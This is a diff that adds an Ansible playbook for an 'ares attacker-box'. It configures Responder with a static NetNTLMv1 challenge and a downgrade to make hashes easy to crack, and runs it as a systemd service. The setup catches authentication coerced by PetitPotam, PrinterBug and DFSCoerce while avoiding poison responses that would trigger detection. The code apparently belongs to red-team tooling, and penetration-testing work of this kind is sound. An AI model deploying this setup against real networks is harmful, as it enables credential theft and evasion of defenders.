@@ -1,0 +1,39 @@
+---
+# Configure Responder for the ares attacker-box use case:
+#   1. Set a static NetNTLMv1 challenge so captured hashes are trivially
+#      crackable via rainbow tables (crack.sh) or hashcat -m 27000.
+#   2. Install a systemd unit that runs Responder in analyze mode (-A: no
+#      LLMNR/NBTNS/MDNS/DNS poisoning) with NetNTLMv1 downgrade
+#      (--lm --disable-ess). Analyze mode still runs the SMB/HTTP/FTP rogue
+#      servers, so coerced auth from PetitPotam/PrinterBug/DFSCoerce lands
+#      here without generating poison responses that light up detection.
+#
+# The ares orchestrator dispatches coercion tools (petitpotam_unauth,
+# dfscoerce, coercer) that direct auth back to the attacker IP but does
+# not spawn a persistent listener itself — this closes that gap.
+
+- name: Set Responder static challenge for NetNTLMv1 rainbow-table cracking
+  ansible.builtin.lineinfile:
+    path: "{{ coercion_tools_responder_conf_path }}"
+    regexp: '^\s*Challenge\s*='
+    line: "Challenge = {{ coercion_tools_responder_challenge }}"
+    backup: true
+  become: true
+
+- name: Install Responder systemd unit
+  ansible.builtin.template:
+    src: responder.service.j2
+    dest: /etc/systemd/system/responder.service
+    mode: '0644'
+  become: true
+  notify: Reload systemd
+
+- name: Flush handlers so systemd sees the new unit before manage-service
+  ansible.builtin.meta: flush_handlers
+
+- name: Manage Responder service
+  ansible.builtin.systemd:
+    name: responder.service
+    state: "{{ coercion_tools_responder_service_state }}"
+    enabled: "{{ coercion_tools_responder_service_enabled }}"
+  become: true
